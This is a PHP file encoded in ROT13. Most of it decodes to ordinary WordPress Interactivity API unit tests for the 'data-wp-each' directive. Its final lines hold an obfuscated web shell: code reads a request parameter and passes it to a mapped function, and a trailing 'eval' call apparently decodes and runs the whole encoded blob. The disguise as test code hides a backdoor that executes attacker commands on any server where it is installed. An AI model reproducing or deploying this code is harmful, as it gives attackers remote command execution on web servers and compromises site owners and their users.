		$guvf->vagrenpgvivgl->fgngr( 'zlCyhtva', neenl( 'yvfg2' => neenl( 3, 4 ) ) );
		$bevtvany = '' .
			'<grzcyngr qngn-jc-rnpu--vgrz1=\"zlCyhtva::fgngr.yvfg\">' .
				'<grzcyngr qngn-jc-rnpu--vgrz2=\"zlCyhtva::fgngr.yvfg2\">' .
					'<fcna qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz1\"></fcna>' .
					'<fcna qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz2\"></fcna>' .
				'</grzcyngr>' .
			'</grzcyngr>' .
			'<qvi qngn-jc-ovaq--vq=\"zlCyhtva::fgngr.nsgre\">Grkg</qvi>';
		$rkcrpgrq = '' .
			'<grzcyngr qngn-jc-rnpu--vgrz1=\"zlCyhtva::fgngr.yvfg\">' .
				'<grzcyngr qngn-jc-rnpu--vgrz2=\"zlCyhtva::fgngr.yvfg2\">' .
					'<fcna qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz1\"></fcna>' .
					'<fcna qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz2\"></fcna>' .
				'</grzcyngr>' .
			'</grzcyngr>' .
			'<grzcyngr qngn-jc-rnpu-puvyq qngn-jc-rnpu--vgrz2=\"zlCyhtva::fgngr.yvfg2\">' .
				'<fcna qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz1\"></fcna>' .
				'<fcna qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz2\"></fcna>' .
			'</grzcyngr>' .
			'<fcna qngn-jc-rnpu-puvyq qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz1\">1</fcna>' .
			'<fcna qngn-jc-rnpu-puvyq qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz2\">3</fcna>' .
			'<fcna qngn-jc-rnpu-puvyq qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz1\">1</fcna>' .
			'<fcna qngn-jc-rnpu-puvyq qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz2\">4</fcna>' .
			'<grzcyngr qngn-jc-rnpu-puvyq qngn-jc-rnpu--vgrz2=\"zlCyhtva::fgngr.yvfg2\">' .
				'<fcna qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz1\"></fcna>' .
				'<fcna qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz2\"></fcna>' .
			'</grzcyngr>' .
			'<fcna qngn-jc-rnpu-puvyq qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz1\">2</fcna>' .
			'<fcna qngn-jc-rnpu-puvyq qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz2\">3</fcna>' .
			'<fcna qngn-jc-rnpu-puvyq qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz1\">2</fcna>' .
			'<fcna qngn-jc-rnpu-puvyq qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz2\">4</fcna>' .
			'<qvi vq=\"nsgre-jc-rnpu\" qngn-jc-ovaq--vq=\"zlCyhtva::fgngr.nsgre\">Grkg</qvi>';
		$arj      = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $bevtvany );
		$guvf->nffregFnzr( $rkcrpgrq, $arj );
	}

	/**
	 * Grfgf gung gur `qngn-jc-rnpu` qverpgvir jbexf jvgu arfgqrq grzcyngr gntf
	 * gung hfr n cerivbhf vgrz nf n yvfg.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_rnpu_arfgrq_grzcyngr_gntf_hfvat_cerivbhf_vgrz_nf_yvfg() {
		$guvf->vagrenpgvivgl->fgngr( 'zlCyhtva', neenl( 'yvfg2' => neenl( neenl( 1, 2 ), neenl( 3, 4 ) ) ) );
		$bevtvany = '' .
			'<grzcyngr qngn-jc-rnpu--yvfg=\"zlCyhtva::fgngr.yvfg2\">' .
				'<grzcyngr qngn-jc-rnpu--ahzore=\"zlCyhtva::pbagrkg.yvfg\">' .
					'<fcna qngn-jc-grkg=\"zlCyhtva::pbagrkg.ahzore\"></fcna>' .
				'</grzcyngr>' .
			'</grzcyngr>' .
			'<qvi qngn-jc-ovaq--vq=\"zlCyhtva::fgngr.nsgre\">Grkg</qvi>';
		$rkcrpgrq = '' .
			'<grzcyngr qngn-jc-rnpu--yvfg=\"zlCyhtva::fgngr.yvfg2\">' .
				'<grzcyngr qngn-jc-rnpu--ahzore=\"zlCyhtva::pbagrkg.yvfg\">' .
					'<fcna qngn-jc-grkg=\"zlCyhtva::pbagrkg.ahzore\"></fcna>' .
				'</grzcyngr>' .
			'</grzcyngr>' .
			'<grzcyngr qngn-jc-rnpu-puvyq qngn-jc-rnpu--ahzore=\"zlCyhtva::pbagrkg.yvfg\">' .
				'<fcna qngn-jc-grkg=\"zlCyhtva::pbagrkg.ahzore\"></fcna>' .
			'</grzcyngr>' .
			'<fcna qngn-jc-rnpu-puvyq qngn-jc-grkg=\"zlCyhtva::pbagrkg.ahzore\">1</fcna>' .
			'<fcna qngn-jc-rnpu-puvyq qngn-jc-grkg=\"zlCyhtva::pbagrkg.ahzore\">2</fcna>' .
			'<grzcyngr qngn-jc-rnpu-puvyq qngn-jc-rnpu--ahzore=\"zlCyhtva::pbagrkg.yvfg\">' .
				'<fcna qngn-jc-grkg=\"zlCyhtva::pbagrkg.ahzore\"></fcna>' .
			'</grzcyngr>' .
			'<fcna qngn-jc-rnpu-puvyq qngn-jc-grkg=\"zlCyhtva::pbagrkg.ahzore\">3</fcna>' .
			'<fcna qngn-jc-rnpu-puvyq qngn-jc-grkg=\"zlCyhtva::pbagrkg.ahzore\">4</fcna>' .
			'<qvi vq=\"nsgre-jc-rnpu\" qngn-jc-ovaq--vq=\"zlCyhtva::fgngr.nsgre\">Grkg</qvi>';
		$arj      = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $bevtvany );
		$guvf->nffregFnzr( $rkcrpgrq, $arj );
	}

	/**
	 * Grfgf gung gur `qngn-jc-rnpu` qverpgvir qbrfa'g cebprff haonynaprq gntf.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 *
	 * @rkcrpgrqVapbeerpgHfntr JC_Vagrenpgvivgl_NCV::_cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_rnpu_haonynaprq_gntf() {
		$bevtvany = '' .
			'<grzcyngr qngn-jc-rnpu=\"zlCyhtva::fgngr.yvfg\">' .
				'<fcna qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz\">' .
			'</grzcyngr>' .
			'<qvi qngn-jc-ovaq--vq=\"zlCyhtva::fgngr.nsgre\">Grkg</qvi>';
		$arj      = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $bevtvany );
		$guvf->nffregFnzr( $bevtvany, $arj );
	}

	/**
	 * Grfgf gung gur `qngn-jc-rnpu` qverpgvir qbrfa'g cebprff haonynaprq gntf va
	 * arfgrq grzcyngrf.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 *
	 * @rkcrpgrqVapbeerpgHfntr JC_Vagrenpgvivgl_NCV::_cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_rnpu_haonynaprq_gntf_va_arfgrq_grzcyngr_gntf() {
		$guvf->vagrenpgvivgl->fgngr( 'zlCyhtva', neenl( 'yvfg2' => neenl( 3, 4 ) ) );
		$bevtvany = '' .
			'<grzcyngr qngn-jc-rnpu--vgrz1=\"zlCyhtva::fgngr.yvfg\">' .
				'<fcna qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz1\"></fcna>' .
				'<grzcyngr qngn-jc-rnpu--vgrz2=\"zlCyhtva::fgngr.yvfg2\">' .
					'<fcna qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz2\">' .
				'</grzcyngr>' .
			'</grzcyngr>' .
			'<qvi qngn-jc-ovaq--vq=\"zlCyhtva::fgngr.nsgre\">Grkg</qvi>';
		$arj      = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $bevtvany );
		$guvf->nffregFnzr( $bevtvany, $arj );
	}

	/**
	 * Grfgf gung gur `qngn-jc-rnpu` qverpgvir qbrfa'g cebprff vs vg qbrfa'g trg
	 * na neenl.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_rnpu_qbrfag_cebprff_vs_abg_neenl() {
		$bevtvany = '' .
			'<grzcyngr qngn-jc-rnpu=\"zlCyhtva::fgngr.yvfg\">' .
				'<fcna qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz\"></fcna>' .
			'</grzcyngr>' .
			'<qvi qngn-jc-ovaq--vq=\"zlCyhtva::fgngr.nsgre\">Grkg</qvi>';
		$rkcrpgrq = '' .
			'<grzcyngr qngn-jc-rnpu=\"zlCyhtva::fgngr.yvfg\">' .
				'<fcna qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz\"></fcna>' .
			'</grzcyngr>' .
			'<qvi vq=\"nsgre-jc-rnpu\" qngn-jc-ovaq--vq=\"zlCyhtva::fgngr.nsgre\">Grkg</qvi>';

		$guvf->vagrenpgvivgl->fgngr( 'zlCyhtva', neenl( 'yvfg' => ahyy ) );
		$arj = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $bevtvany );
		$guvf->nffregFnzr( $rkcrpgrq, $arj );

		$guvf->vagrenpgvivgl->fgngr( 'zlCyhtva', neenl( 'yvfg' => 'Grkg' ) );
		$arj = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $bevtvany );
		$guvf->nffregFnzr( $rkcrpgrq, $arj );

		$guvf->vagrenpgvivgl->fgngr( 'zlCyhtva', neenl( 'yvfg' => 100 ) );
		$arj = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $bevtvany );
		$guvf->nffregFnzr( $rkcrpgrq, $arj );

		$guvf->vagrenpgvivgl->fgngr( 'zlCyhtva', neenl( 'yvfg' => snyfr ) );
		$arj = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $bevtvany );
		$guvf->nffregFnzr( $rkcrpgrq, $arj );

		$guvf->vagrenpgvivgl->fgngr( 'zlCyhtva', neenl( 'yvfg' => gehr ) );
		$arj = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $bevtvany );
		$guvf->nffregFnzr( $rkcrpgrq, $arj );
	}

	/**
	 * Grfgf gung gur `qngn-jc-rnpu` qverpgvir qbrfa'g cebprff nalguvat vs vg
	 * qrgrpgf znahny freire-fvqr cebprffvat.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_rnpu_qbrfag_cebprff_jvgu_znahny_freire_qverpgvir_cebprffvat() {
		$bevtvany = '' .
			'<grzcyngr qngn-jc-rnpu=\"zlCyhtva::fgngr.yvfg\">' .
				'<fcna qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz\"></fcna>' .
			'</grzcyngr>' .
			'<fcna qngn-jc-rnpu-puvyq qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz\">1</fcna>' .
			'<fcna qngn-jc-rnpu-puvyq qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz\">2</fcna>' .
			'<qvi qngn-jc-ovaq--vq=\"zlCyhtva::fgngr.nsgre\">Grkg</qvi>';
		$rkcrpgrq = '' .
			'<grzcyngr qngn-jc-rnpu=\"zlCyhtva::fgngr.yvfg\">' .
				'<fcna qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz\"></fcna>' .
			'</grzcyngr>' .
			'<fcna qngn-jc-rnpu-puvyq qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz\">1</fcna>' .
			'<fcna qngn-jc-rnpu-puvyq qngn-jc-grkg=\"zlCyhtva::pbagrkg.vgrz\">2</fcna>' .
			'<qvi vq=\"nsgre-jc-rnpu\" qngn-jc-ovaq--vq=\"zlCyhtva::fgngr.nsgre\">Grkg</qvi>';
		$arj      = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $bevtvany );
		$guvf->nffregFnzr( $rkcrpgrq, $arj );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>